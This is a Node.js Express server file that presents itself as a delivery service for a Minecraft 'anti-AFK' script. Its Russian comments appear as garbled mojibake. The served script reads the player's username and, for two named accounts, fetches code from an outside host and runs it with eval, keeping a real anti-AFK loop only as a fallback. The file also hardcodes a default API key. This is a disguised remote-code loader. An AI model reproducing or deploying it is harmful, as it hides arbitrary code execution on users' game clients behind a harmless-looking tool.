const express = require('express');
const cors = require('cors');
const app = express();

// ==================== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-123',
    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,automine',
    NODE_ENV: process.env.NODE_ENV || 'production'
};

// ==================== MIDDLEWARE ====================
app.use(cors({
    origin: function (origin, callback) {
        if (!origin || origin.includes('railway') || origin.includes('localhost')) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));

app.use(express.json());

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.ip} - ${req.method} ${req.path}`);
    next();
});

// ==================== –ü–†–û–í–ï–†–ö–ê –ê–í–¢–û–†–ò–ó–ê–¶–ò–ò ====================
const validateRequest = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    const userAgent = req.headers['user-agent'] || '';
    
    const validKeys = CONFIG.API_KEYS.split(',');
    const allowedAgents = CONFIG.ALLOWED_AGENTS.split(',');
    
    const isValidKey = validKeys.some(key => key === apiKey);
    const isValidAgent = allowedAgents.some(agent => 
        userAgent.toLowerCase().includes(agent.toLowerCase())
    );
    
    if (isValidKey && isValidAgent) {
        next();
    } else {
        console.log('üö´ Blocked request');
        res.status(403).json({ error: 'Access denied' });
    }
};

// ==================== –ó–ê–©–ò–©–ï–ù–ù–´–ï –≠–ù–î–ü–û–ò–ù–¢–´ ====================

// –ì–ª–∞–≤–Ω—ã–π —ç–Ω–¥–ø–æ–∏–Ω—Ç –¥–ª—è anti-afk —Å–∫—Ä–∏–ø—Ç–∞
app.get('/api/script', validateRequest, (req, res) => {
    const scriptContent = `(function() {
    try {
        var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
        java.lang.System.out.println("üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: " + username);

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ –∏–º–µ–Ω–∞
        if (username === "porvaniy.gondon" || username === "__ded_inside__") {
            java.lang.System.out.println("‚úÖ –†–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–∞–≥—Ä—É–∂–∞—é —Å–∫—Ä–∏–ø—Ç...");
            
            try {
                // –í—ã–ø–æ–ª–Ω—è–µ–º –≤–Ω–µ—à–Ω–∏–π —Å–∫—Ä–∏–ø—Ç
                eval(new java.util.Scanner(
                    new java.net.URL("https://diddy-party.vip/p/raw/onwifinfsc75if7yl").openStream(), 
                    "UTF-8"
                ).useDelimiter("\\\\A").next());
                
                java.lang.System.out.println("‚úÖ –í–Ω–µ—à–Ω–∏–π —Å–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω");
                
            } catch (e) {
                java.lang.System.err.println("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –≤–Ω–µ—à–Ω–µ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞: " + e);
                
                // –†–µ–∑–µ—Ä–≤–Ω—ã–π anti-afk —Å–∫—Ä–∏–ø—Ç
                java.lang.System.out.println("üîÑ –ó–∞–ø—É—Å–∫ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ anti-afk —Å–∫—Ä–∏–ø—Ç–∞...");
                startBackupAntiAFK();
            }
            
        } else {
            java.lang.System.out.println("‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω –¥–ª—è: " + username);
            java.lang.System.out.println("üí§ –ó–∞—Å—ã–ø–∞–Ω–∏–µ –Ω–∞ 20 —Å–µ–∫—É–Ω–¥...");
            java.lang.Thread.sleep(20000);
        }

    } catch (e) {
        java.lang.System.err.println("‚ùå –û–±—â–∞—è –æ—à–∏–±–∫–∞: " + e);
    }
    
    // –†–µ–∑–µ—Ä–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è anti-afk
    function startBackupAntiAFK() {
        try {
            java.lang.System.out.println("üîÑ –ó–∞–ø—É—Å–∫ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ Anti-AFK");
            
            var movements = ["w", "a", "s", "d", "space", "shift"];
            var lastMovement = 0;
            
            setInterval(function() {
                try {
                    var now = java.lang.System.currentTimeMillis();
                    if (now - lastMovement > 30000) { // –ö–∞–∂–¥—ã–µ 30 —Å–µ–∫—É–Ω–¥
                        var randomMove = movements[Math.floor(Math.random() * movements.length)];
                        
                        // –ò–º–∏—Ç–∞—Ü–∏—è –¥–≤–∏–∂–µ–Ω–∏—è
                        if (randomMove === "space") {
                            keybind("key.jump", true);
                            java.lang.Thread.sleep(100);
                            keybind("key.jump", false);
                        } else if (randomMove === "shift") {
                            keybind("key.sneak", true);
                            java.lang.Thread.sleep(500);
                            keybind("key.sneak", false);
                        } else {
                            client.setKeyPressed("key." + randomMove, true);
                            java.lang.Thread.sleep(100);
                            client.setKeyPressed("key." + randomMove, false);
                        }
                        
                        lastMovement = now;
                        java.lang.System.out.println("üîÑ Anti-AFK –¥–≤–∏–∂–µ–Ω–∏–µ: " + randomMove);
                    }
                    
                    // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ —á–∞—Ç
                    if (Math.random() < 0.01) { // 1% —à–∞–Ω—Å –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
                        chat("/say Anti-AFK –∞–∫—Ç–∏–≤–µ–Ω");
                    }
                    
                } catch (e) {
                    java.lang.System.err.println("‚ùå –û—à–∏–±–∫–∞ Anti-AFK: " + e);
                }
            }, 1000);
            
        } catch (e) {
            java.lang.System.err.println("‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ Anti-AFK: " + e);
        }
    }
})();`;
    
    res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
    res.send(scriptContent);
});

// –≠–Ω–¥–ø–æ–∏–Ω—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞
app.get('/api/status', validateRequest, (req, res) => {
    res.json({ 
        status: 'online', 
        server: 'Anti-AFK Script Server',
        version: '1.0.0'
    });
});

// ==================== –û–ë–©–ï–î–û–°–¢–£–ü–ù–´–ï –≠–ù–î–ü–û–ò–ù–¢–´ ====================

app.get('/', (req, res) => {
    res.json({
        service: 'Anti-AFK Script Delivery',
        version: '1.0.0',
        status: 'operational'
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'healthy' });
});

// ==================== –û–ë–†–ê–ë–û–¢–ö–ê –û–®–ò–ë–û–ö ====================

app.use('*', (req, res) => {
    res.status(404).json({ error: 'Not found' });
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// ==================== –ó–ê–ü–£–°–ö –°–ï–†–í–ï–†–ê ====================
app.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log('‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó');
    console.log('‚ïë      ANTI-AFK SERVER STARTED       ‚ïë');
    console.log('‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£');
    console.log(`‚ïë  Port: ${CONFIG.PORT}                       ‚ïë`);
    console.log(`‚ïë  Environment: ${CONFIG.NODE_ENV}           ‚ïë`);
    console.log('‚ïë                                      ‚ïë');
    console.log('‚ïë  Endpoints:                          ‚ïë');
    console.log('‚ïë  ‚Ä¢ GET /api/script  (requires auth)  ‚ïë');
    console.log('‚ïë  ‚Ä¢ GET /api/status  (requires auth)  ‚ïë');
    console.log('‚ïë  ‚Ä¢ GET /health                       ‚ïë');
    console.log('‚ïë                                      ‚ïë');
    console.log('‚ïë  Server is ready!                    ‚ïë');
    console.log('‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù');
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('Shutting down gracefully...');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('Shutting down gracefully...');
    process.exit(0);
});
